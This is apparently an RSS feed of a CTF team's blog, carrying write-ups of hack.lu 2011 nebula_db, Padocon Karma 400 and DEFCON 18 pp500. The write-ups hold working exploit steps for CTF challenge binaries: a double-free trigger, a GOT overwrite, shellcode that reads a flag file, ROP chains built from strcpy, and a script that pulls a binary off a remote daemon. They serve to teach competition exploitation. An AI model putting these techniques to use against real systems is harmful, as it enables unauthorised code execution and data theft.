<p>With libc in hand, we know exact offset to any libc function and ROP payload can be constructed using “<a href="http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/" target="_self">data re-use way</a>” via <em>sprintf() – *which can perform byte-per-byte transfer the same as *strcpy() – *or “<a href="http://auntitled.blogspot.com/2011/09/rop-with-common-functions-in.html" target="_blank">ROP with common functions in Ubuntu/Debian x86</a>“</em>. *</p>

<h3 id="the-flag">The flag</h3>

<p>The flag was put in a file with strange name so you cannot guess and get it via directory traversal bug.</p>

<pre class="brush: plain; title: ; notranslate" title="">$ ls -l /home/nebulaserver

total 24

-r-xr-x--- 1 root nebulaserver 11195 2011-09-11 20:50 a.out

-r--r----- 1 root nebulaserver    27 2011-09-20 13:19 IguessTHISisTHEflagDOOD

drwxr-xr-x 3 root nebulaserver  4096 2011-09-11 20:22 nebula

-r-xr-x--- 1 root nebulaserver    82 2011-09-20 17:00 restart.sh

$ cat /home/nebulaserver/IguessTHISisTHEflagDOOD

Flag: R0PPINGy0urWAYinDUDE

</pre>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $ ls -l /home/nebulaserver
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  total 24
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r-xr-x&#8212; 1 root nebulaserver 11195 2011-09-11 20:50 a.out
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r&#8211;r&#8212;&#8211; 1 root nebulaserver    27 2011-09-20 13:19 IguessTHISisTHEflagDOOD
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  drwxr-xr-x 3 root nebulaserver  4096 2011-09-11 20:22 nebula
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r-xr-x&#8212; 1 root nebulaserver    82 2011-09-20 17:00 restart.sh
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $ cat /home/nebulaserver/IguessTHISisTHEflagDOOD
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  Flag: R0PPINGy0urWAYinDUDE
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $
</div>

<ul>
  <li>*</li>
</ul>


  ]]></description>
</item>

	<item>
  <title>#7th at CSAW CTF</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/26/7th-at-csaw-ctf.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-09-26T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/26/7th-at-csaw-ctf.html</guid>
  <description><![CDATA[
     <p>There are quite a number of CTF games this month. After <a href="http://www.vnsecurity.net/2011/09/4th-at-hack-lu-ctf/">#hacklu</a> last week, some of us have played <a href="https://csawctf.poly.edu/scoreboard.php" target="_blank">CSAW CTF Quals</a> over the weekend. We finished at 7th (solved all the challenges except the 200 points Recon Judge challenge of <a href="http://trailofbits.com/" target="_blank">Dino Dai Zovi</a>).</p>

<p>Congratz to the top 6 teams who solved all the challenges. See you guys at <a href="http://ctf.itsec.rwth-aachen.de/" target="_blank">rwthCTF</a> next week.</p>

<p style="text-align: center">
  <a href="https://csawctf.poly.edu/scoreboard.php"><img class="aligncenter size-full wp-image-1211" title="csawctf_ranking" src="/wp/storage/uploads/2011/09/csawctf_ranking.png" alt="csawctf_ranking" width="480" height="211" /></a>
</p>

<p style="text-align: center">
  <em><span style="color: #888888">P/S: &#8216;Undergraduate&#8217; category was a mistake :P)</span></em>
</p>


  ]]></description>
</item>

	<item>
  <title>hack.lu CTF 2011 nebula DB systems</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/22/hack-lu-ctf-2011-nebula-db-systems.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-09-22T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/22/hack-lu-ctf-2011-nebula-db-systems.html</guid>
  <description><![CDATA[
     <p>Challenge Summary:</p>

<blockquote>
  <p>While you were investigating the Webserver of Nebula Death Stick Services, we, the Galactic’s Secret Service, put our hands on a SSH account of one of the Nebula Death Stick Services founders. This account directly leads to one of their Death Stick storage clusters. Therefore we instruct you with another mission: this time you will have to break their database systems in order to get higher privileges and find further infos about Nebula Corp. And again, may the force be with you!<br />
User: nebulauser</p>

  <p>Pass: nebulauser</p>

  <p>Host: ctf.hack.lu</p>

  <p>Port: 2008</p>
</blockquote>

<p>After login to ctf.hack.lu server we get 4 files:<br />
-nebula_db<br />
-nebula_db_nosuid<br />
_nebula_db.c<br />
_hint</p>

<p>nebula_db is a file with suid(s) bits, when you execute that you have required permission to read the flag, nebula_db_nosuid is the file for testing and debuging purpose, nebula_db.c is source code of challenge, hint is tell you where is the flag stored.<br />
So basically you need to execute nebula_db and some how try to alter execution flow to do some more thing for you ( read the flag ).<br />
First things is try to spot the vuln by reading source code they provided:</p>

<pre class="brush: cpp; title: ; notranslate" title="">/* Nebula Death Stick Services Database Management System
 * This Software has been written to keep track of our customers and their orders.
 * It is still in developement, but I'm pretty sure it's already stable enough for a safe maintenance.
 */

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

#define DB_SIZE 256

char *db[DB_SIZE];

int edit_entry(char *choice, unsigned int entry)
{
        char edit[256], *ln;
        unsigned int len;

        if (atoi(choice) &gt; entry - 1 || atoi(choice) &lt; 0 || entry == 0)
                return -1;

        len = strlen(db[atoi(choice)]);

        printf("Enter your edit: ");
        fgets(edit, sizeof(edit) - 1, stdin);

        ln = strchr(edit, 'n');

        if (ln != NULL)
                *ln = '&#092;&#048;';

        strncpy(db[atoi(choice)], edit, len);

        return 0;
}

char *insert_new_order(unsigned int entry, char *name, char *amount)
{
        char sname[256], samount[256], *nl, *ptr;(3)
        int ret;

        nl = strchr(name, 'n');

        if (nl != NULL)
                *nl = '&#092;&#048;';

        nl = strchr(amount, 'n');

        if (nl != NULL)
                *nl = '&#092;&#048;';

        ret = asprintf(&amp;ptr, "ID: %d: Name: %s Amount: %s", entry, name, amount);

        if (ret == 0)
                return NULL;

        return ptr;
}

char *enter_new_order(unsigned int entry)
{
        char name[256], amount[256];

        printf("Enter a Name: ");
        fgets(name, sizeof(name) - 1, stdin);

        printf("Enter amount of Death Sticks: ");
        fgets(amount, sizeof(amount) - 1, stdin);

        if (atoi(amount) &lt;= 0) {
                fprintf(stderr, "Insert a real amount please!n");
                return NULL;
        }

        if (entry &gt; DB_SIZE - 1) {
                fprintf(stderr, "Database already full!n");
                return NULL;
        }

        return insert_new_order(entry, name, amount);

}

int print_database(unsigned int entry)
{
        unsigned int i;

        for (i = 0; i &lt; entry; i++)
                printf("%sn", db[i]);

        return 0;
}

int exit_free(unsigned int entry)
{
        unsigned int i;

        for (i = 0; i &lt; entry; i++)
                free(db[i]);

        return 0;
}

int main(int argc, char **argv)
{
        char choice[256], *ret;
        unsigned int entry = 0, len, i;

        puts(
                "Nebula Database set up!n"
                "Enter your choice of action:n"
                "1 - Insert new ordern"
                "2 - Edit ordern"
                "3 - List ordersn"
                "4 - Exitn"
        );

        while (1) {(4)
                printf("Your choice: ");
                fgets(choice, sizeof(choice) - 1, stdin);
                switch (atoi(choice)) {
                        case 1:
                        ret = enter_new_order(entry);

                        if (ret == NULL) {
                                fprintf(stderr, "Error inserting new order!n");
                                break;
                        }

                        db[entry] = ret;
                        entry++;(2)
                        break;

                        case 2:
                        printf("Enter the ID of your order: ");
                        fgets(choice, sizeof(choice) - 1, stdin);

                        if (edit_entry(choice, entry) == -1)
                                fprintf(stderr, "That entry does not exist!n");

                        break;

                        case 3:
                        print_database(entry);
                        break;

                        case 4:
                        return exit_free(entry);

                        default:
                        fprintf(stderr, "Option does not existn");
                }
        }

        return 0;
}

</pre>

<p>As they said, the challenge is a small db management, it save name and amount of orders in an array up to 256 record. You can add or edit a record.<br />
So the funny part is:</p>

<pre class="brush: cpp; title: ; notranslate" title="">ret = asprintf(&amp;ptr, "ID: %d: Name: %s Amount: %s", entry, name, amount);
   if (ret == 0)
                return NULL;
</pre>

<p>And after reading manpages of asprintf, i figured out there is a problem when using it without fully understand what it returned, so return value indicate how many bytes it printed, and the funny part is when it failed, it will return -1 but programmer is not check for that case, they think when it will return 0 mean it failed.<br />
It mean we can still increase entry value at (2) without create any new record. It basic will lead to double free memory corruption error. So next thing is try to figure out how to force asprintf return -1 ( or force it can’t alloc any memory ). After getting help from rd and xichzo, we found ulimit do the tricks:</p>

<pre class="brush: bash; title: ; notranslate" title="">suto@ubuntu:~$  ulimit -v 1795
suto@ubuntu:~$ ./nebula_db
Nebula Database set up!
Enter your choice of action:
1 - Insert new order
2 - Edit order
3 - List orders
4 - Exit

Your choice: 1
Enter a Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Enter amount of Death Sticks: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Your choice: 4
*** glibc detected *** ./n: double free or corruption (out): 0x08049118 ***
Aborted (core dumped)
suto@ubuntu:~$
</pre>

<p>After getting here, i see another way can lead to successful exploitation. When asprintf fail, it will use ptr(3) at a result for main program use to keep track a record, somehow we can make this ptr point to some where we want and edit_entry will take care the rest to write a value we control to that address(since ptr is use without initialized)<br />
But i can’t find anyway to do that, so i thinking another solution.<br />
And i wonder if when the first alloc failt, so it will use the original value of at that address. After some check i’m stuck cause i can’t not do anything without this default value.<br />
I try some google in hopeless :p with keyword: “control uninitialized memory”<br />
At the first resutls is:<br />
<a href="http://drosenbe.blogspot.com/2010/04/controlling-uninitialized-memory-with.html">http://drosenbe.blogspot.com/2010/04/controlling-uninitialized-memory-with.html<br />
</a><br />
Another trick to control memory at the begining of process execution. Let’s check:</p>

<pre class="brush: bash; title: ; notranslate" title="">suto@ubuntu:~$ export LD_PRELOAD=`python -c 'print "A"*20000'`
suto@ubuntu:~$ ulimit -c unlimited
suto@ubuntu:~$  ulimit -v 1795
suto@ubuntu:~$ ./nebula_db
ERROR: ld.so: object '&lt;A&gt;*20000...
 from LD_PRELOAD cannot be preloaded: ignored.
Nebula Database set up!
Enter your choice of action:
1 - Insert new order
2 - Edit order
3 - List orders
4 - Exit

Your choice: 1
Enter a Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Enter amount of Death Sticks: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Your choice: 2
Enter the ID of your order: 0
Segmentation fault (core dumped)
suto@ubuntu:~$
</pre>

<p>So if this tricks work, we will have a write to address at 0×41414141.</p>

<pre class="brush: cpp; title: ; notranslate" title="">(gdb) x/i $eip
=&gt; 0xb764b706:  movdqu (%edi),%xmm1
(gdb) i r $edi
edi            0x41414141       1094795585
(gdb) bt
#0  0xb764b706 in ?? () from /lib/i386-linux-gnu/libc.so.6
#1  0x0804864c in edit_entry ()
#2  0x08048a04 in main ()
</pre>

<p>So this is all i want :p Next things is find some where to write, and i choose GOT section, first thing i trying is printf@GOT and using a hardcode address to return, and i stupid try to do that to the end of the game :(.<br />
After that, thinking a little bit, i got another solution:<br />
After the calling edit_entry ( where we can directly write to GOT section), program will return to while loop at (4) and continue execute, then i see a good candidate to overwrite is atoi, why? cause after fgets at (5) eax will point to our string, and we will use call *eax gadget to execute our shellcode.<br />
And finally:</p>

<pre class="brush: bash; title: ; notranslate" title="">export LD_PRELOAD=`python -c 'print "x18x91x04x08"*4000+"xcc"*1000'`
</pre>

<p>This will force program wirte to atoi@PLT and</p>

<pre class="brush: bash; title: ; notranslate" title="">suto@ubuntu:~$ objdump -d n | grep call | grep eax
 80485a8:       ff 14 85 08 90 04 08    call   *0x8049008(,%eax,4)
 80485ef:       ff d0                   call   *%eax
 8048b1b:       ff d0                   call   *%eax
suto@ubuntu:~$ python -c 'print "1n"+"A"*250+"n"+"1"*250+"n"+"2n0n"+"x1bx8bx04x08"*40+"xcc"*400' &gt; input
suto@ubuntu:~$ bash
suto@ubuntu:~$ ulimit -s unlimited
suto@ubuntu:~$ export LD_PRELOAD=`python -c 'print "x18x91x04x08"*4000+"xcc"*1000'`
suto@ubuntu:~$ ulimit -c unlimited
suto@ubuntu:~$  ulimit -v 1795
suto@ubuntu:~$ ./nebula_db &lt; input
ERROR: ld.so: object from LD_PRELOAD cannot be preloaded: ignored.
Nebula Database set up!
Enter your choice of action:
1 - Insert new order
2 - Edit order
3 - List orders
4 - Exit

Trace/breakpoint trap (core dumped)
.......
(gdb) x/20x $eip
0xbfa33571:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa33581:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa33591:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa335a1:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa335b1:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
</pre>

<p>So you can replace xcc with a shellcode to read the flag key file.<br />
Here is my shellcode to read /home/suto/flag and write to /tmp/flag: ( <a href="http://pastebin.com/yWUE40cM">assembly source</a>)</p>

<pre class="brush: cpp; title: ; notranslate" title="">char shellcode[] =
        "xebx44x5bx31xc0x88x43x0fxb0x05xb9x42x44x41x41"
        "xc1xe1x14xc1xe9x14x66xbaxe4x01xcdx80x50x83xc3"
        "x10x31xc0xb0x05xcdx80x5bx50xb0xc8x29xc4x89xe1"
        "x89xc2x31xc0xb0x03xcdx80xb0xc8x01xc4x5bx31xc0"
        "xb0x04xcdx80x31xc0xb0x01xcdx80xe8xb7xffxffxff"
        "x2fx68x6fx6dx65x2fx73x75x74x6fx2fx66x6cx61x67"
        "x41x2fx74x6dx70x2fx66x6cx61x67";

</pre>

<pre class="brush: cpp; title: ; notranslate" title="">suto@ubuntu:~$ python -c 'print "1n"+"A"*250+"n"+"1"*250+"n"+"2n0n"+  "xebx44x5bx31xc0x88x43x0fxb0x05xb9x42x44x41x41       xc1xe1x14xc1xe9x14x66xbaxe4x01xcdx80x50x83xc3
x10x31xc0xb0x05xcdx80x5bx50xb0xc8x29xc4x89xe1
x89xc2x31xc0xb0x03xcdx80xb0xc8x01xc4x5bx31xc0
xb0x04xcdx80x31xc0xb0x01xcdx80xe8xb7xffxffxff
x2fx68x6fx6dx65x2fx73x75x74x6fx2fx66x6cx61x67
x41x2fx74x6dx70x2fx66x6cx61x67";' &gt; input
suto@ubuntu:~$./nebula_db &lt; input
suto@ubuntu:~$cat /tmp/flag
hello
</pre>

<p>Finally,congratz to bobsleigh is the only team solved it.<br />
Thanks fluzfinger team for a great ctf. See u guys in next year!</p>

<p>–suto–</p>


  ]]></description>
</item>

	<item>
  <title>#4th at hack.lu CTF</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/21/4th-at-hack-lu-ctf.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-09-21T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/21/4th-at-hack-lu-ctf.html</guid>
  <description><![CDATA[
     <p style="text-align: center">
  Thanks <a href="http://fluxfingers.net/" target="_blank">FluxFingers</a> for the great #CTF at <a href="http://2011.hack.lu/index.php/CaptureTheFlag" target="_blank">hack.lu</a>!!!!
</p>

<p>[<img class="aligncenter size-full wp-image-1174" title="final_score" src="/wp/storage/uploads/2011/09/final_score.png" alt="final_score" width="306" height="352" />][1]</p>

<p style="text-align: -webkit-auto">

 [1]: /wp/storage/uploads/2011/09/final_score.png
</p>

  ]]></description>
</item>

	<item>
  <title>DEFCON 19 CTF Quals: writeups collection</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/05/31/defcon-19-ctf-quals-writeups-collection.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-05-31T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/05/31/defcon-19-ctf-quals-writeups-collection.html</guid>
  <description><![CDATA[
     <ul>
  <li>Compilation by Rogunix: <a href="http://rogunix.com/ctf/defconquals19.html">http://rogunix.com/ctf/defconquals19.html</a></li>
  <li><a href="http://ddtek.biz/2011-quals-results.tar.lzma">Raw results</a></li>
</ul>


  ]]></description>
</item>

	<item>
  <title>Padocon 2011 CTF Karma 400 exploit: the data re-use way</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/01/31/padocon-2011-ctf-karma-400-exploit-the-data-re-use-way.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-01-31T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/01/31/padocon-2011-ctf-karma-400-exploit-the-data-re-use-way.html</guid>
  <description><![CDATA[
     <p>Karma 400 at Padocon 2011 Online CTF is a fun challenge. The binary was provided without source code, you can reach its decompiled source at <a href="http://disekt.tk/node/39" target="_blank">disekt’s team writeup</a>. In that writeup, the solution was bruteforcing address of IO stdin buffer with return to do_system() trick. Karma 400 is different than other karma attackme:</p>

<ul>
  <li>It runs as a network daemon (via xinetd): so you cannot abuse its arguments and environments</li>
  <li>Input buffer is 200 bytes: you have room for payload (not only just overwrite saved EIP)</li>
  <li>There is a 10 seconds sleep before main() returns: this makes bruteforcing less effective</li>
</ul>

<p>In this post I will show how to exploit karma 400 with <a href="http://force.vnsecurity.net/download/longld/BHUS10_Paper_Payload_already_inside_data_reuse_for_ROP_exploits.pdf">data re-use method</a>.</p>

<pre class="brush: plain; title: ; notranslate" title="">$ gdb -q karma400_lolcosmostic
gdb$ pattern_create 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
gdb$ r
input: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
 EAX: 0x00000000  EBX: 0x41346141  ECX: 0xBFFFF384  EDX: 0x00B84FF4  o d I t S z a p c
 ESI: 0x00000000  EDI: 0x61413561  EBP: 0x62413961  ESP: 0xBFFFF3DC  EIP: 0x08048793
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
[0x007B:0xBFFFF3DC]------------------------------------------------------[stack]
0xBFFFF42C : 64 37 41 64 38 41 64 39 - 41 65 30 41 65 31 41 65 d7Ad8Ad9Ae0Ae1Ae
0xBFFFF41C : 41 64 32 41 64 33 41 64 - 34 41 64 35 41 64 36 41 Ad2Ad3Ad4Ad5Ad6A
0xBFFFF40C : 36 41 63 37 41 63 38 41 - 63 39 41 64 30 41 64 31 6Ac7Ac8Ac9Ad0Ad1
0xBFFFF3FC : 63 31 41 63 32 41 63 33 - 41 63 34 41 63 35 41 63 c1Ac2Ac3Ac4Ac5Ac
0xBFFFF3EC : 41 62 36 41 62 37 41 62 - 38 41 62 39 41 63 30 41 Ab6Ab7Ab8Ab9Ac0A
0xBFFFF3DC : 30 41 62 31 41 62 32 41 - 62 33 41 62 34 41 62 35 0Ab1Ab2Ab3Ab4Ab5
--------------------------------------------------------------------------1
=&gt; 0x8048793:    ret
 0x8048794:    nop
 0x8048795:    nop
 0x8048796:    nop
--------------------------------------------------------------------------------
0x08048793 in ?? ()
gdb$ x/x $esp
0xbffff3dc:    0x31624130

gdb$ pattern_offset 200 0x31624130
Searching for 0Ab1 in buf size 200
32
</pre>

<p>We have 200-32 = 168 bytes left for our payload. The goal is to execute a custom shell in /tmp, for this purpose I choose execv(“/tmp/v”, ptr_to_NULL).</p>

<p><strong>Step 1:</strong> transfer the string “/tmp/v” to un-used data region using chained strcpy() calls</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ x/32wx 0x08049a50
0x8049a50:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049a60 &lt;stdin&gt;:    0x00b85440    0x00000000    0x00000000    0x00000000
0x8049a70:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049a80 &lt;stdout&gt;:    0x00b854e0    0x00000000    0x00000000    0x00000000
0x8049a90:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049aa0:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049ab0:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049ac0:    0x00000000    0x00000000    0x00000000    0x00000000

TARGET = 0x8049a90
NULLARGV = TARGET - 4

gdb$ info func strcpy@plt
All functions matching regular expression "strcpy@plt":

Non-debugging symbols:
0x080484f0  strcpy@plt

STRCPY = 0x080484f0

gdb$ x/4i 0x80485e3
 0x80485e3:    pop    ebx
 0x80485e4:    pop    ebp
 0x80485e5:    ret
 0x80485e6:    lea    esi,[esi+0x0]
gdb$

POP2RET = 0x80485e3

gdb$ findsubstr 0x08048000 0x08049000 "/tmp/v\x00"
Searching for '/tmp/vx00'
'/': 0x8048134
't': 0x80480f6
'm': 0x80482dc
'p': 0x8048313
'/': 0x8048134
'vx00': 0x80485e7

DATA1 = [0x8048134, 0x80480f6, 0x80482dc, 0x8048313, 0x8048134, 0x80485e7]
</pre>

<p>The payload will look like:<br />
[ STRCPY, POP2RET, TARGET, DATA1[0],  STRCPY, POP2RET, TARGET+1, DATA1<a href="http://force.vnsecurity.net/download/longld/BHUS10_Paper_Payload_already_inside_data_reuse_for_ROP_exploits.pdf">1</a>, … ]</p>

<p><strong>Step-2:</strong> overwrite GOT entry of puts() (or any function) with execv()<br />
This is a bit tricky, because libc address is ASCII ARMOR we cannot put execv() address directly on the payload. Fortunately, libc address is not randomized so we can directly overwrite GOT with execv() address using strcpy likes the data above.</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ p execv
$2 = {&lt;text variable, no debug info&gt;} 0xac4680 &lt;execv&gt;

EXECV = 0xac4680
gdb$ info functions puts@plt
All functions matching regular expression "puts@plt":

Non-debugging symbols:
0x08048540  puts@plt
gdb$ x/i 0x08048540
 0x8048540 &lt;puts@plt&gt;:    jmp    DWORD PTR ds:0x8049a48

PLTADDR = 0x08048540
GOTADDR = 0x8049a48

gdb$ findsubstr 0x08048000 0x08049000  0xac4680
Searching for 'x80Fxac'
'x80': 0x804803d
'F': 0x8048003
'xac': 0x80481b0

gdb$ findsubstr 0x08048000 0x08049000  0x00
Searching for 'x00'
'x00': 0x8048007

DATA2 = [0x804803d, 0x8048003, 0x80481b0, 0x8048007]
</pre>

<p>The payload will look like:<br />
[ STRCPY, POP2RET, GOTADDR, DATA2[0], STRCPY, POP2RET, GOTADDR+1, DATA2<a href="http://force.vnsecurity.net/download/longld/BHUS10_Paper_Payload_already_inside_data_reuse_for_ROP_exploits.pdf">1</a>, … ]</p>

<p>Finally, we make call to execv() via puts@plt:<br />
[ PLTADDR, 0xdeadbeef, TARGET, NULLARGV ]</p>

<p>We have a small problem, our payload size is 176. Each strcpy() call takes 16 bytes payload and there is 10 calls for data transfer, we have to reduce at least 1 call. We can tweak our custom shell a bit to reduce payload length, instead of “/tmp/v” we use “/tmp/ld-linux.so.2” so the last string to copy is “/ld-linux.so.2”.</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ findsubstr 0x08048000 0x0804a000  "/"
Searching for '/'
'/': 0x8048134
gdb$ x/s 0x8048134
0x8048134:     "/lib/ld-linux.so.2"
gdb$ x/s 0x8048138
0x8048138:     "/ld-linux.so.2"

DATA1 = [0x8048134, 0x80480f6, 0x80482dc, 0x8048313, 0x8048138]
</pre>

<p>Wrap things up and test:</p>

<pre class="brush: python; title: ; notranslate" title="">gdb$ shell python
Python 2.6.6 (r266:84292, Sep 15 2010, 15:52:39)
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; TARGET = 0x8049a90
&gt;&gt;&gt; NULLARGV = TARGET - 4
&gt;&gt;&gt; STRCPY = 0x080484f0
&gt;&gt;&gt; POP2RET = 0x80485e3
&gt;&gt;&gt; DATA1 = [0x8048134, 0x80480f6, 0x80482dc, 0x8048313, 0x8048138]
&gt;&gt;&gt; PAYLOAD = []
&gt;&gt;&gt; for i in range(len(DATA1)):
...     PAYLOAD += [STRCPY, POP2RET, TARGET+i, DATA1[i]]
...
&gt;&gt;&gt; for i in range(len(DATA2)):
...     PAYLOAD += [STRCPY, POP2RET, GOTADDR+i, DATA2[i]]
...
&gt;&gt;&gt; PAYLOAD += [PLTADDR, 0xdeadbeef, TARGET, NULLARGV]
&gt;&gt;&gt; len(PAYLOAD)
40
&gt;&gt;&gt; fd = open("payload", "wb")
&gt;&gt;&gt; import struct
&gt;&gt;&gt; fd.write("A"*32) # padding
&gt;&gt;&gt; for i in range(len(PAYLOAD)):
...     fd.write(struct.pack("&lt;I", PAYLOAD[i]))
...
&gt;&gt;&gt; fd.close()
&gt;&gt;&gt; ^D

gdb$ shell ln -s /usr/bin/id /tmp/ld-linux.so.2
gdb$ r &lt; payload
input: process 1866 is executing new program: /usr/bin/id

Program received signal SIGPIPE, Broken pipe.
</pre>

<p>Pwned!</p>

<p><em>Notes</em>:</p>

<ul>
  <li>This way can also be applied to exploit karma 500</li>
  <li>Disekt’s return to do_system() trick is really neat for local exploit</li>
</ul>


  ]]></description>
</item>

	<item>
  <title>DEFCON 18 Quals: Pwtent Pwnables 500 write up</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/05/28/defcon-18-quals-pwtent-pwnables-500-write-up.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-05-28T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/05/28/defcon-18-quals-pwtent-pwnables-500-write-up.html</guid>
  <description><![CDATA[
     <p>This is a short write up since I’m a bit lazy. We didn’t solved it during the quals as it was too late (we exhausted and most of member including myself went to sleep so I only started looking into this in the morning of Monday. Didn’t have enough of time to finish it).</p>

<p>For pp500, ddtek gave us a pcap network dump of a remote exploit to a daemon on host 192.41.96.63, port 6913 and password to login is ‘antagonist’. Playing around with the daemon, I found out that ‘b’ command returns you back a block of 512 bytes from the binary.</p>

<pre>Password: antagonist
? to see the menu
&gt; ?
x - quit
d - donate entropy
r - report
b - /dev/hrnd
? - help
&gt; b
Seed: 0
ELF     4�$4 (444�������&amp;&amp; l � ��/libexec/ld-elf.so.FreeBSDk5%20   .1!
                                                                      "
/)(-*&gt;</pre>

<p>Seed value from 0 to 19 returned the same data, 20 returned different data, 21-39 same as 20, … So I wrote a script to extract out all the blocks from the binary with seed values 0, 20, 40, 60, 80, ….. After filtered out all the duplicated blocks, there were totally 21 unique blocks.</p>

<pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/env python
import sys
import socket

class humpty:
        def  __init__(self, host, port):
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((host, port))
                ret = self.s.recv(1024)
                print ret

        def login(self, passwd):
                self.s.send(passwd + "n")
                ret = self.s.recv(1024)
                print ret

        def getdata(self, seed):
                print seed
                cmd = "bn"
                self.s.send(cmd)
                ret = self.s.recv(1024)
                print ret
                ret = self.s.recv(1024)
                print ret

                self.s.send("%dn" % seed)
                ret = ret + self.s.recv(1024)
                ret = ret
                #print len(ret), repr(ret)
                return ret[6:518]

        def close(self):
                self.s.close()

def log(file, data):
        f = open(file, "w")
        f.write(data)
        f.close()

host = '192.41.96.63'
port = 6913

c = humpty(host, port)
a = raw_input("Enter to continue");
c.login("antagonist")

data = []
for i in range(0, 100):
        data.append(c.getdata(20*i));

data = list(set(data))
print "Total %d unique blocks" % len(data)
for i in range(0, len(data)):
        log("%d"%i, data[i])

print "Done"
c.close()
</pre>

<p>From the pcap dump session, we can find out that the size of humpty binary is 10392, which is 21 blocks of 512 bytes</p>

<pre>-rwxr-x---  1 root  humpty  10392 May 22 19:06 humpty
-rw-r-----  1 root  humpty     21 May 22 19:01 key</pre>

